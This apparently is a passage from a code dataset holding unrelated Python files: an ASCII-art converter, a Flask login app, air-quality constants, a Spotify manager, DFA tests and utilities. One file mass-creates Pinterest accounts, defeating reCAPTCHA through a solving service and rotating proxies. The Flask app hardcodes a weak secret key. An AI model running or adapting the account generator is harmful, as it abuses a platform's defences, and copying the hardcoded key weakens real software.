len(sys.argv) < 4:\n        light_bias = light_bias_prompt()\n    else:\n        light_bias = float(sys.argv[3])\n\n    if len(sys.argv) < 5:\n        output_location = None\n    else:\n        output_location = sys.argv[4]\n\n    img.thumbnail((maxsize, maxsize))\n\n    return img, light_bias, output_location\n\n\ndef to_ascii(img, width, height, light_bias, min_val, max_val):\n    art = \"\"\n    for y in range(height):\n        for x in range(width):\n            my_tuple = img.getpixel((x, y))\n            if my_tuple[1] == 0:\n                art += \"  \"\n            else:\n                art += (pixel_brightness(my_tuple[0], min_val, max_val, light_bias) + \" \")\n        art += \"\\n\"\n    return art\n\n\ndef find_brightness_range(img, width, height):\n    max_val = 0\n    min_val = 255\n    for y in range(height):\n        for x in range(width):\n            my_tuple = img.getpixel((x, y))\n            if my_tuple[0] > max_val and my_tuple[1] != 0:\n                max_val = my_tuple[0]\n            elif my_tuple[0] < min_val and my_tuple[1] != 0:\n                min_val = my_tuple[0]\n    return min_val, max_val\n\n\ndef pixel_brightness(grayscale_value, min_val, max_val, bias):\n    pixel = grayscale_value - min_val\n    pixel /= (max_val - min_val)\n    pixel = math.pow(pixel, bias)\n    pixel *= (len(ASCII_CHAR_MAP) - 1)\n\n    return ASCII_CHAR_MAP[math.ceil(pixel)]\n\n\nASCII_CHAR_MAP = \"@&%QWNM0gB$#DR8mHXKAUbGOpV4d9h6PkqwSE2]ayjxY5Zoen[ult13If}C{iF|(7J)vTLs?z/*cr!+<>;=^,_:'-.` \"\n\n\nuser_input = prepare_image()\nuser_image, lightness_bias, art_file = user_input[0], user_input[1], user_input[2]\nimage_width, image_height = user_image.size[0], user_image.size[1]\n\n\nbrightness_range = find_brightness_range(user_image.convert('LA'), image_width, image_height)\nlightest_pixel, darkest_pixel = brightness_range[0], brightness_range[1]\n\n\nascii_art = to_ascii(user_image.convert('LA'), image_width, image_height, lightness_bias, lightest_pixel, darkest_pixel)\n\nif art_file is None:\n    print(ascii_art)\nelse:\n    f = open(art_file, \"w\")\n    f.write(ascii_art)\n    f.close()\n",
    "from datetime import datetime, timedelta\nfrom itertools import chain\nfrom db_handler import Database, firestore\nfrom flask import Flask, request, render_template, session, url_for, redirect\nfrom login import check_login_data, check_login\nfrom register import check_id, check_signup_data, check_password, set_user_info\nfrom google.cloud.firestore_v1.base_query import FieldFilter\n\napp = Flask(__name__)\napp.secret_key = 'super secret key'\napp.config['SESSION_TYPE'] = 'filesystem'\napp.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)\n\n\n# app_login.py\n# ----------------------------------------------------------\n\n\n# \uae30\ubcf8\ud398\uc774\uc9c0->login\ud398\uc774\uc9c0\n@app.route(\"/\")\ndef home():\n    return redirect(url_for('login'))\n\n\n# app_watch.py \uc5d0\ub7ec \ud398\uc774\uc9c0\n@app.route(\"/error/\")\ndef invalid():\n    return render_template('invalid.html')\n\n\n# \ub85c\uadf8\uc778\ud398\uc774\uc9c0->\ud68c\uc6d0\uac00\uc785, \uba54\uc778\ud398\uc774\uc9c0\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        userid = request.form['userid']\n        password = request.form['password']\n        if check_login_data(userid, password):\n            user_info = Database.get_userinfo()\n            if check_login(user_info, userid, password):\n                session[\"logged_in\"] = True\n                session['userid'] = userid\n                print(session)\n                return redirect(url_for('mainpage1'))\n            else:\n                print('\uc544\uc774\ub514\uc640 \ube44\ubc00\ubc88\ud638\ub97c \uc815\ud655\ud788 \uc785\ub825\ud574 \uc8fc\uc138\uc694')\n                return render_template('login.html')\n        else:\n            print('\uc544\uc774\ub514\uc640 \ube44\ubc00\ubc88\ud638\ub97c \uc815\ud655\ud788 \uc785\ub825\ud574 \uc8fc\uc138\uc694')\n            return render_template('login.html')\n    else:\n        return render_template('login.html')\n\n\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        userid = request.form['userid']\n        password = request.form['password']\n        passwordcheck = request.form['passwordcheck']\n        nickname = request.form['nickname']\n        name = request.form['name']\n        email = request.form['email']\n        user_info = Database.get_userinfo()\n        if check_id(user_info, userid):\n            if check_signup_data(password, nickname, name, email):\n                if check_password(password, passwordcheck):\n                    set_user_info(user_info, userid, password,nickname, name, email)\n                    return redirect(url_for('login'))\n        return render_template('register.html')\n    else:\n        return render_template('register.html')\n\n\n@app.route(\"/mainpage1\", methods=['GET', 'POST'])\ndef mainpage1():\n    # \ub85c\uadf8\uc778 \uc138\uc158 \ub9cc\ub8cc \uc2dc or \ub85c\uadf8\uc778 \ud558\uc9c0 \uc54a\uc558\ub294\ub370 \ud398\uc774\uc9c0 \uc811\uc18d\ud560 \uc2dc\n    if \"userid\" not in session.keys():\n        return redirect(url_for(\"invalid\"))\n    session_id = session['userid']\n    content_info = Database.get_contentinfo()\n    ccl = list(content_info.where(filter=FieldFilter(\"category\", \"==\", \"1\")).where(filter=FieldFilter(\"is_visible\", \"==\", True)).order_by(\"create_date\", direction=firestore.Query.DESCENDING).stream())\n    return render_template(\"mainpage1.html\", ccl=ccl, session_id=session_id)\n\n\n@app.route(\"/mainpage2\", methods=['GET', 'POST'])\ndef mainpage2():\n    # \ub85c\uadf8\uc778 \uc138\uc158 \ub9cc\ub8cc \uc2dc or \ub85c\uadf8\uc778 \ud558\uc9c0 \uc54a\uc558\ub294\ub370 \ud398\uc774\uc9c0 \uc811\uc18d\ud560 \uc2dc\n    if \"userid\" not in session.keys():\n        return redirect(url_for(\"invalid\"))\n    session_id = session['userid']\n    content_info = Database.get_contentinfo()\n    ccl = list(content_info.where(filter=FieldFilter(\"category\", \"==\", \"2\")).where(filter=FieldFilter(\"is_visible\", \"==\", True)).order_by(\"create_date\", direction=firestore.Query.DESCENDING).stream())\n    return render_template(\"mainpage1.html\", ccl=ccl, session_id=session_id)\n\n\n@app.route(\"/mainpage3\", methods=['GET', 'POST'])\ndef mainpage3():\n    # \ub85c\uadf8\uc778 \uc138\uc158 \ub9cc\ub8cc \uc2dc or \ub85c\uadf8\uc778 \ud558\uc9c0 \uc54a\uc558\ub294\ub370 \ud398\uc774\uc9c0 \uc811\uc18d\ud560 \uc2dc\n    if \"userid\" not in session.keys():\n        return redirect(url_for(\"invalid\"))\n    session_id = session['userid']\n    content_info = Database.get_contentinfo()\n    ccl = list(content_info.where(filter=FieldFilter(\"category\", \"==\", \"3\")).where(filter=FieldFilter(\"is_visible\", \"==\", True)).order_by(\"create_date\", direction=firestore.Query.DESCENDING).stream())\n    return render_template(\"mainpage1.html\", ccl=ccl, session_id=session_id)\n\n\n@app.route(\"/search\", methods=['GET', 'POST'])\ndef search():\n    # \ub85c\uadf8\uc778 \uc138\uc158 \ub9cc\ub8cc \uc2dc or \ub85c\uadf8\uc778 \ud558\uc9c0 \uc54a\uc558\ub294\ub370 \ud398\uc774\uc9c0 \uc811\uc18d\ud560 \uc2dc\n    if \"userid\" not in session.keys():\n        return redirect(url_for(\"invalid\"))\n    session_id = session['userid']\n    searching=request.form['search_id']\n    print(searching)\n    content_info = Database.get_contentinfo()\n    ccl = list(content_info.where(filter=FieldFilter(\"userinfo_id\", \"==\", searching)).where(filter=FieldFilter(\"is_visible\", \"==\", True)).order_by(\"create_date\", direction=firestore.Query.DESCENDING).stream())\n    return render_template('search.html',ccl=ccl,session_id=session_id)\n\n\n@app.route(\"/logout\")\ndef logout():\n    session['logged_in'] = False\n    session.pop('userid', None)\n    print(session)\n    return redirect(url_for('login'))\n\n\n# app_write.py\n# ----------------------------------------------------------\n\n\n# \uac8c\uc2dc\uae00 \uc791\uc131\ud558\uae30 24.04.03\n@app.route('/write', methods=['GET'",
    "\"\"\"\nDefining constants for the project.\n\"\"\"\n\nICON_UPDATE = \"mdi:update\"\nDOMAIN = \"cz_air_quality\"\nCONF_STOP_SEL = \"station_selector\"\nSTATION_LIST = [\n    \"Praha 8-Karl\u00edn\",\n    \"Praha 2-Legerova (hot spot)\",\n    \"Praha 1-n. Republiky\",\n    \"Praha 2-Riegrovy sady\",\n    \"Praha 10-Vr\u0161ovice\",\n    \"Praha 9-Vyso\u010dany\",\n    \"Okraj Prahy\",\n    \"Praha 6-B\u0159evnov\",\n    \"Praha 4-Chodov\",\n    \"Praha 8-Kobylisy\",\n    \"Leti\u0161t\u011b Praha\",\n    \"Praha 4-Libu\u0161\",\n    \"Praha 10-Pr\u016fmyslov\u00e1\",\n    \"Praha 10-\u0160rob\u00e1rova\",\n    \"Praha 5-Stod\u016flky\",\n    \"Praha 6-Suchdol\",\n    \"Praha 7-Hole\u0161ovice\",\n    \"Beroun\",\n    \"Kutn\u00e1 Hora-Orebitsk\u00e1\",\n    \"Kladno-st\u0159ed m\u011bsta\",\n    \"Kladno-\u0160vermov\",\n    \"Kol\u00edn SAZ\",\n    \"Kralupy nad Vltavou-sportovi\u0161t\u011b\",\n    \"Mlad\u00e1 Boleslav\",\n    \"Ond\u0159ejov\",\n    \"P\u0159\u00edbram-B\u0159ezov\u00e9 Hory\",\n    \"Ro\u017e\u010falovice-Rusk\u00e1\",\n    \"Tobolka-\u010certovy schody\",\n    \"\u010cesk\u00e9 Bud\u011bjovice\",\n    \"\u010ces. Bud\u011bjovice-T\u0159e\u0161\u0148.\",\n    \"Chur\u00e1\u0148ov\",\n    \"Kocelovice\",\n    \"Prachatice\",\n    \"Strakonice-Z\u0160 Strakonice\",\n    \"T\u00e1bor\",\n    \"Hojn\u00e1 Voda\",\n    \"Klatovy soud\",\n    \"Kamenn\u00fd \u00dajezd\",\n    \"Plze\u0148-Slovany\",\n    \"Plze\u0148-st\u0159ed\",\n    \"Plze\u0148-Lochot\u00edn\",\n    \"Plze\u0148-Doubravka\",\n    \"Plze\u0148 - mobil\",\n    \"P\u0159imda\",\n    \"Cheb\",\n    \"P\u0159ebuz\",\n    \"Sokolov\",\n    \"D\u011b\u010d\u00edn\",\n    \"Doksany\",\n    \"Chomutov\",\n    \"Krupka\",\n    \"Lom\",\n    \"Litom\u011b\u0159ice\",\n    \"M\u011bd\u011bnec\",\n    \"Most\",\n    \"Rudolice v Hor\u00e1ch\",\n    \"Sn\u011b\u017en\u00edk\",\n    \"\u0160t\u011bt\u00ed\",\n    \"Teplice \",\n    \"Tu\u0161imice\",\n    \"\u00dast\u00ed n. L.-Prokopa Divi\u0161e\",\n    \"\u00dast\u00ed n.L.-V\u0161ebo\u0159ick\u00e1 (hot spot)\",\n    \"\u00dast\u00ed n.L.-Ko\u010dkov\",\n    \"\u00dast\u00ed n.L.-m\u011bsto\",\n    \"\u010cesk\u00e1 L\u00edpa\",\n    \"Fr\u00fddlant\",\n    \"Horn\u00ed V\u00edtkov\",\n    \"Liberec-Rochlice\",\n    \"Sou\u0161\",\n    \"Uheln\u00e1\",\n    \"Hradec Kr\u00e1lov\u00e9-Brn\u011bnsk\u00e1\",\n    \"Hradec Kr\u00e1lov\u00e9-observato\u0159\",\n    \"Hr.Kr\u00e1l.-Sukovy sady\",\n    \"Krkono\u0161e-R\u00fdchory\",\n    \"Polom\",\n    \"Trutnov - Tkalcovsk\u00e1\",\n    \"Moravsk\u00e1 T\u0159ebov\u00e1 - Piaristick\u00e1.\",\n    \"Pardubice-Rosice\",\n    \"Pardubice Dukla\",\n    \"Svratouch\",\n    \"Jihlava-Znojemsk\u00e1\",\n    \"Kosteln\u00ed Myslov\u00e1\",\n    \"Ko\u0161etice\",\n    \"Pelh\u0159imov\",\n    \"T\u0159eb\u00ed\u010d\",\n    \"\u017d\u010f\u00e1r nad S\u00e1zavou\",\n    \"Brno - D\u011btsk\u00e1 nemocnice\",\n    \"Brno-Arboretum\",\n    \"Brno-L\u00e1ny\",\n    \"Brno-Svatoplukova\",\n    \"Brno-L\u00ed\u0161e\u0148\",\n    \"Brno-\u00davoz (hot spot)\",\n    \"Brno-Tu\u0159any\",\n    \"Brno-Kom\u00e1rov\",\n    \"Hodon\u00edn\",\n    \"Kucha\u0159ovice\",\n    \"Mikulov-Sedlec\",\n    \"Sivice\",\n    \"Mokr\u00e1\",\n    \"Znojmo\",\n    \"B\u011blot\u00edn\",\n    \"Jesen\u00edk-l\u00e1zn\u011b\",\n    \"Lo\u0161tice\",\n    \"Olomouc-Hej\u010d\u00edn\",\n    \"Olomouc-\u0160meralova\",\n    \"Hranice\",\n    \"P\u0159erov\",\n    \"Prost\u011bjov\",\n    \"\u0160umperk, Z\u0160 Vrchlick\u00e9ho\",\n    \"Velk\u00e1 Byst\u0159ice\",\n    \"Otrokovice-m\u011bsto\",\n    \"Ro\u017enov pod Radho\u0161t\u011bm\",\n    \"\u0160t\u00edtn\u00e1 n.Vl\u00e1\u0159\u00ed\",\n    \"T\u011b\u0161novice\",\n    \"Uhersk\u00e9 Hradi\u0161t\u011b\",\n    \"Vala\u0161sk\u00e9 Mezi\u0159\u00ed\u010d\u00ed\",\n    \"Zl\u00edn\",\n    \"Zl\u00edn - Z\u0160 Kv\u00edtkova\",\n    \"B\u00edl\u00fd K\u0159\u00ed\u017e\",\n    \"\u010cerven\u00e1 hora\",\n    \"\u010cesk\u00fd T\u011b\u0161\u00edn\",\n    \"Fr\u00fddek-M\u00edstek\",\n    \"Hav\u00ed\u0159ov Z\u00da\",\n    \"Hav\u00ed\u0159ov\",\n    \"Karvin\u00e1 Z\u00da\",\n    \"Karvin\u00e1\",\n    \"Mal\u00e1 Mor\u00e1vka\",\n    \"No\u0161ovice\",\n    \"Ostrava-\u010ceskobratrsk\u00e1 (hot spot)\",\n    \"Ostrava-Fifejdy\",\n    \"Ostrava-Hru\u0161ov\",\n    \"Ostrava-Mari\u00e1nsk\u00e9 Hory\",\n    \"Ostrava-Poruba DD\",\n    \"Ostrava-Poruba \u010cHM\u00da\",\n    \"Ostrava-P\u0159\u00edvoz\",\n    \"Ostrava-Radvanice Z\u00da\",\n    \"Ostrava-Radvanice OZO\",\n    \"Opava-Kate\u0159inky\",\n    \"Ostrava-Z\u00e1b\u0159eh\",\n    \"Rychvald\",\n    \"Stud\u00e9nka\",\n    \"T\u0159inec-Kanada\",\n    \"T\u0159inec-Kosmos\",\n    \"V\u011b\u0159\u0148ovice-Doln\u00ed Lutyn\u011b\",\n    \"Vrbno pod Prad\u011bdem\",\n    \"Z\u00e1tor\"]\n\n\n",
    "import json\r\nimport random\r\nimport threading\r\nimport time\r\n\r\nimport capsolver\r\nimport loguru\r\nimport requests\r\nimport modules.internxt as internxt\r\n\r\ncapsolver.api_key = json.loads(open(\"settings.json\",\"r\").read())[\"capsolver_key\"]\r\nclass P\u0131nterestGen:\r\n    def __init__(self):\r\n        self.session = requests.session()\r\n\r\n        self.session.headers = {\r\n            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',\r\n            'accept-language': 'tr-TR,tr;q=0.6',\r\n            'cache-control': 'no-cache',\r\n            'pragma': 'no-cache',\r\n            'sec-ch-ua': '\"Brave\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\r\n            'sec-ch-ua-mobile': '?0',\r\n            'sec-ch-ua-platform': '\"Windows\"',\r\n            'sec-fetch-dest': 'document',\r\n            'sec-fetch-mode': 'navigate',\r\n            'sec-fetch-site': 'none',\r\n            'sec-fetch-user': '?1',\r\n            'sec-gpc': '1',\r\n            'upgrade-insecure-requests': '1',\r\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\r\n        }\r\n        self.internxtmailapi = internxt.Internxt()\r\n        self.email, self.emailToken = self.internxtmailapi.get_new_mail()\r\n        self.accountPassw = \"\".join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+=-') for i in range(10)])\r\n\r\n        proxy = random.choice(open(\"proxies.txt\").readlines()).strip()\r\n        self.session.proxies = {'http': 'http://' + proxy, 'https': 'http://' + proxy}\r\n\r\n\r\n    def get_csrf(self):\r\n        response = self.session.get('https://tr.pinterest.com/')\r\n        self.session.headers['x-csrftoken'] = response.cookies['csrftoken']\r\n        self.session.headers['x-pinterest-appstate'] = 'active'\r\n        self.session.headers['x-pinterest-pws-handler'] = 'www/index.js'\r\n        self.session.headers['x-pinterest-source-url'] = '/'\r\n        self.session.headers['x-requested-with'] = 'XMLHttpRequest'\r\n    def get_bday(self):\r\n        current_year = time.localtime().tm_year\r\n        random_years_ago = random.randint(18, 30)\r\n        selected_year = current_year - random_years_ago\r\n\r\n        start_time = time.mktime((selected_year, 1, 1, 0, 0, 0, 0, 0, 0))\r\n        end_time = time.mktime((selected_year + 1, 1, 1, 0, 0, 0, 0, 0, 0))\r\n\r\n        random_epoch = random.randint(int(start_time), int(end_time))\r\n        return random_epoch\r\n    def solve_recaptcha(self):\r\n        captcha_token = capsolver.solve(\r\n            {\r\n                \"type\": \"ReCaptchaV3EnterpriseTaskProxyless\",\r\n                \"websiteURL\": \"https://tr.pinterest.com\",\r\n                \"websiteKey\": \"6Ldx7ZkUAAAAAF3SZ05DRL2Kdh911tCa3qFP0-0r\",\r\n                \"apiDomain\": \"www.recaptcha.net\",\r\n                \"pageAction\": \"web_unauth\"\r\n            }\r\n        )[\"gRecaptchaResponse\"]\r\n        loguru.logger.info(f\"Captcha solved, {captcha_token[:50]}..\")\r\n        return captcha_token\r\n    def send_signup_req(self):\r\n        data = {\r\n            'source_url': '/',\r\n            'data': json.dumps({\"options\":{\"type\":\"email\",\"birthday\":int(self.get_bday()),\"email\":self.email,\"password\":self.accountPassw,\"country\":\"US\",\"first_name\":\"Alita\",\"last_name\":\"\",\"recaptchaV3Token\":self.solve_recaptcha(),\"visited_pages\":json.dumps([{\"path\":\"/\",\"pageType\":\"home\",\"ts\":int(str(time.time()).replace(\".\",\"\")[:13])}]),\"user_behavior_data\":\"{}\"},\"context\":{}})\r\n        }\r\n\r\n        response = self.session.post('https://tr.pinterest.com/resource/UserRegisterResource/create/',data=data)\r\n        if response.json()[\"resource_response\"][\"status\"] == \"success\":\r\n            loguru.logger.success(f\"[{self.email}] Account created successfully.\")\r\n\r\n        pinterest_sess_cookie = self.session.cookies[\"_pinterest_sess\"]\r\n\r\n        open(\"accounts.txt\",\"a\").write(f\"{self.email}:{self.accountPassw}:{pinterest_sess_cookie}\\n\")\r\n\r\ndef handle_tread():\r\n    while True:\r\n        pin = P\u0131nterestGen()\r\n        pin.get_csrf()\r\n        pin.send_signup_req()\r\n\r\nif __name__ == '__main__':\r\n    thread_count = input(\"how much thread? > \")\r\n    for i in range(int(thread_count)):\r\n        threading.Thread(target=handle_tread).start()",
    "import spotipy\nfrom spotipy.oauth2 import SpotifyOAuth\nimport json\nfrom constants import SPOTIPY_CLIENT_ID, SPOTIPY_CLIENT_SECRET, SPOTIPY_REDIRECT_URI, PROXIES, PLAYLIST_ID\nfrom utilities import TrackManager, LoggerSetup\nfrom typing import List, Dict\n\n\nclass SpotifyService:\n    def __init__(self):\n        self.scope = 'user-library-read,user-library-modify,playlist-modify-public'\n        self.client = self._init_spotify_client()\n        self.logger = LoggerSetup.setup_logger()\n        self.removed_tracks = []\n\n    def _init_spotify_client(self) -> spotipy.Spotify:\n        auth_manager = SpotifyOAuth(client_id=SPOTIPY_CLIENT_ID, client_secret=SPOTIPY_CLIENT_SECRET,\n                                    redirect_uri=SPOTIPY_REDIRECT_URI, proxies=PROXIES, open_browser=False,\n                                    scope=self.scope, cache_path=\".cache\")\n        return spotipy.Spotify(auth_manager=auth_manager, proxies=PROXIES)\n\n    def fetch_and_refresh_tracks(self):\n        self.logger.info(\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0442\u0440\u0435\u043a\u043e\u0432 \u0438\u0437 Spotify\u2026\")\n        filename = 'spotify_tracks.json'\n        track_manager = TrackManager(filename)\n        liked_tracks = []\n        results = self.client.current_user_saved_tracks()\n        counter = 0\n        while results['next']:\n            counter += 1\n            self.logger.info(f\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u044b {counter}...\")\n            liked_tracks.extend(results['items'])\n            results = self.client.next(results)\n        track_manager.refresh_tracks(liked_tracks, 'spotify')\n\n    def add_to_spotify(self, tracks: List[Dict]):\n        for track in tracks:\n            try:\n                track_info = \\\n                    self.client.search(q=f\"{track['artist']} {track['track_name']}\", type='track')['tracks'][\n                        'items'][0]\n                track_id = track_info['id']\n                self.client.current_user_saved_tracks_add([track_id])\n                self.client.playlist_add_items(playlist_id=PLAYLIST_ID, items=[track_id])\n            except IndexError:\n                self.logger.warning(f'\u0422\u0440\u0435\u043a {track[\"track_name\"]} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track[\"artist\"]} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 Spotify.')\n\n        self.remove_duplicates()\n\n    def remove_duplicates(self):\n        self.logger.info(\"\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432...\")\n        liked_tracks = []\n        deleted_track_ids = []\n        results = self.client.current_user_saved_tracks()\n        counter = 0\n        while results['next']:\n            liked_tracks.extend(results['items'])\n            results = self.client.next(results)\n\n        for i in range(len(liked_tracks) - 1, -1, -1):\n            track_id = liked_tracks[i]['track']['id']\n            if track_id not in deleted_track_ids:\n                for j in range(i - 1, -1, -1):\n                    if track_id == liked_tracks[j]['track']['id']:\n                        counter += 1\n                        self.client.current_user_saved_tracks_delete([track_id])\n                        deleted_track_ids.append(\n                            {'id': track_id, 'artist': liked_tracks[j]['track']['artists'][0]['name'],\n                             'track_name': liked_tracks[j]['track']['name']})\n                        break\n        if counter > 0:\n            self.logger.info(f\"\u0423\u0434\u0430\u043b\u0435\u043d\u043e {counter} \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432.\")\n            with open('deleted_spotify_tracks.json', 'w', encoding='utf-8') as f:\n                json.dump(deleted_track_ids, f, ensure_ascii=False, indent=4)\n        else:\n            self.logger.info(\"\u0414\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u043e\u0432 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e.\")\n",
    "from tester import random_test, random_str_fixed_len, random_str_len\nfrom dfa import DFA\nfrom dfa import State as DFAState\nfrom mermaid_parser import parse_mermaid\n\ndef test_hw1():\n    # length >= 2 and start != end\n    mermaid = \"\"\"stateDiagram-v2\n\n[*] --> Q0\nQ0 --> Q1: 0\nQ1 --> Q1: 0\nQ1 --> Q2: 1\nQ2 --> Q1: 0\nQ2 --> Q2: 1\n\nQ0 --> Q3: 1\nQ3 --> Q3: 1\nQ3 --> Q4: 0\nQ4 --> Q3: 1\nQ4 --> Q4: 0\n\nQ2 --> [*]\nQ4 --> [*]\"\"\"\n    res, d = parse_mermaid(mermaid)\n    if res != \"DFA\":\n        raise ValueError(\"Not a DFA\")\n    def test_func(input: str) -> bool:\n        return len(input) >= 2 and input[0] != input[-1]\n    # fixed length test cases\n    random_test(d.run, d.alphabet, 1000, test_func, input_gen=lambda alphabet: random_str_fixed_len(alphabet, 4)) \n    random_test(d.run, d.alphabet, 1000, test_func)\n\n\ndef test_hw2():\n    # all substring of length 3 at most contains one '1', at least 3 characters\n    mermaid = \"\"\"stateDiagram-v2\n#[*] --> Q0\nQ0 --> Q0: 0\nQ0 --> Q1: 1\nQ1 --> Q2: 0\nQ2 --> Q3: 0\nQ3 --> Q3: 0\nQ3 --> Q1: 1\nQ1 --> Qn: 1\nQ2 --> Qn: 1\nQn --> Qn: 0,1\n#Q0 --> [*]\n#Q1 --> [*]\n#Q2 --> [*]\n#Q3 --> [*]\"\"\"\n    res, d = parse_mermaid(mermaid)\n    if res != \"DFA\":\n        raise ValueError(\"Not a DFA\")\n    def test_func(input: str) -> bool:\n        for i in range(len(input) - 2):\n            if input[i:i+3].count('1') > 1:\n                return False\n        return True\n    # at least 3 characters\n    random_test(d.run, d.alphabet, 1000, test_func, input_gen=lambda a : random_str_len(a, 3, 30))\n\ndef test_hw2_2():\n    # all substring of length 3 at most contains one '1', at least 1 character\n    mermaid = \"\"\"stateDiagram-v2\n#[*] --> Q4\nQ4 --> Q5: 0\nQ4 --> Q6: 1\nQ5 --> Q0: 0\nQ5 --> Q8: 1\nQ8 --> Qn: 1\nQ8 --> Q2: 0\nQ6 --> Q9: 0\nQ6 --> Q10: 1\nQ9 --> Qn: 1\nQ9 --> Q0: 0\nQ10 --> Qn: 0,1\nQ0 --> Q0: 0\nQ0 --> Q1: 1\nQ1 --> Q2: 0\nQ2 --> Q3: 0\nQ3 --> Q3: 0\nQ3 --> Q1: 1\nQ1 --> Qn: 1\nQ2 --> Qn: 1\nQn --> Qn: 0,1\n#Q0 --> [*]\n#Q1 --> [*]\n#Q2 --> [*]\n#Q3 --> [*]\n#Q4 --> [*]\n#Q5 --> [*]\n#Q6 --> [*]\n#Q8 --> [*]\n#Q9 --> [*]\n#Q10 --> [*]\"\"\"\n    res, d = parse_mermaid(mermaid)\n    if res != \"DFA\":\n        raise ValueError(\"Not a DFA\")\n    def test_func(input: str) -> bool:\n        for i in range(len(input) - 2):\n            if input[i:i+3].count('1') > 1:\n                return False\n        return True\n    # less than 3 characters accept\n    random_test(d.run, d.alphabet, 1000, test_func, input_gen=lambda a : random_str_len(a, 1, 30))\n\n\n\ndef main():\n    print(\"Start testing...\")\n    test_hw1()\n    print(\"[hw1] done.\")\n    test_hw2()\n    print(\"[hw2] done.\")\n    test_hw2_2()\n    print(\"[hw2][enhanced] done.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import Network_Initialization as NI\r\nimport Network_SystemTray as NS\r\nimport Network_PopWindow as NP\r\nimport Network_login as NL\r\nimport Network_Logs as NLogs\r\nimport Network_method as NM\r\nimport os\r\nimport sys\r\nimport subprocess\r\nimport threading\r\n\r\n\r\nclass NetworkForAHNU:\r\n    def __init__(self):\r\n        self.LoginNetwork = NL.NetworkLogin()\r\n        self.popup = NP.NotificationPopup()\r\n        self.logger = NLogs.Logger()\r\n        self.exe_path = os.path.abspath(sys.argv[0])\r\n        self.internet_check_thread = None\r\n        self.app = None\r\n        self.window = None\r\n\r\n        self.HomePageField = \"\"\r\n        self.LoginPageField = \"\"\r\n        self.Automatic_login = True\r\n\r\n        self.pause_event = threading.Event()\r\n\r\n    def get_date(self):\r\n        self.HomePageField = self.LoginNetwork.HomePageField\r\n        self.LoginPageField = self.LoginNetwork.LoginPageField\r\n        self.Automatic_login = self.LoginNetwork.Automatic_login\r\n\r\n    def start(self):\r\n        self.LoginNetwork.url_decryption()\r\n        self.LoginNetwork.read_setting()\r\n        self.get_date()\r\n\r\n        self.app = NS.QApplication(sys.argv)\r\n        self.window = NS.MainWindow(self.LoginNetwork, self.pause_event)\r\n        self.LoginNetwork.window = self.window\r\n        self.window.tray_icon.app = self.app\r\n        self.window.tray_icon.internet_check_thread = self.internet_check_thread\r\n        self.window.tray_icon.pause_event = self.pause_event\r\n\r\n        self.internet_check_thread = threading.Thread(\r\n            target=NM.internet_connection,\r\n            args=(self.exe_path, self.popup, self.LoginNetwork, self.logger, self.pause_event),\r\n            daemon=True\r\n        )\r\n        self.internet_check_thread.start()\r\n\r\n        sys.exit(self.app.exec_())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    monitor = NetworkForAHNU()\r\n    if NM.check_login_script(monitor.exe_path):\r\n        monitor.start()\r\n    else:\r\n        if os.path.exists(os.path.join(os.path.dirname(monitor.exe_path), \"LoginFileCorrelation.docx\")):\r\n            subprocess.call([\"start\", \"\", os.path.join(os.path.dirname(monitor.exe_path), \"LoginFileCorrelation.docx\")],\r\n                            shell=True)\r\n        if NI.main()[0]:\r\n            monitor.start()\r\n        else:\r\n            sys.exit(0)\r\n",
    "\"\"\"\nDescription: \nAuthor: Nicolas Gaudin\nDate Created: March 19, 2024\nDate Modified: April 02, 2024\nVersion: 1.0\nPython Version: 3.10.12\nDependencies: time, sys\nLicense: MIT License\n\"\"\"\n\n\n#utilization\n# 2 vcd files with same signals\n# it compares consequently traces of aimed signals\n# signals to be compared are declared in the variable \"signals\"\n# if you want to analyze a signal from a bloc that is declared multiples times, only the first declared will be analyzed\n# cannot compare 1-bit signal\n\n\nimport time, sys\n\nstart_time = time.time_ns()\n\nold_stdout = sys.stdout\nlog_file = open(\"message.log\",\"w\")\nsys.stdout = log_file\n\n\ndef searchOccurence(file, signal) -> int:\n    F = []\n    vcdtime = 0\n    invcd1 = 'ffffffffffffffffff' #impossible value \n\n    is_in = 1\n    header = 1\n\n    # printTab(file)\n    with open(file, 'r') as fvcd:\n        for vcd in fvcd:\n            # retrieve trigger start and stop\n            if header == 0:\n                if vcd.find('#',0,1) != -1:\n                    vcdtime = vcd.replace(\"#\",'')\n                    vcdtime = vcdtime.replace(\"\\n\",'')\n                if ((vcd.find(invcd1) != -1) and (vcd.find('b',0,1) != -1)):\n                    listt = []\n                    listt.append(vcdtime)\n                    listt.append(vcd.replace(invcd1,'').replace(\" \\n\",''))\n                    F.append(listt)\n            if vcd.find('#0',0,2) != -1:\n                # print(Fore.RED + \"debug\")\n                # print(Style.RESET_ALL)\n                header = 0\n            if(is_in == 1) :\n                if vcd.find(signal) != -1:\n                    # print(vcd)\n                    test = vcd.split(' ')\n                    test = list(filter(None, test))\n                    # print(test)\n                    if (len(test) >= 5 ):\n                        if((test[4] == signal) and (len(signal) == len(test[4]))):\n                            invcd1 = test[3]\n                            is_in = 0\n                            # printTab(invcd1)\n    return F\n\ndef searchDiff(f1, f2, signals) -> int:\n\n    for signal in signals:\n        F1 = searchOccurence(f1, signal)\n        F2 = 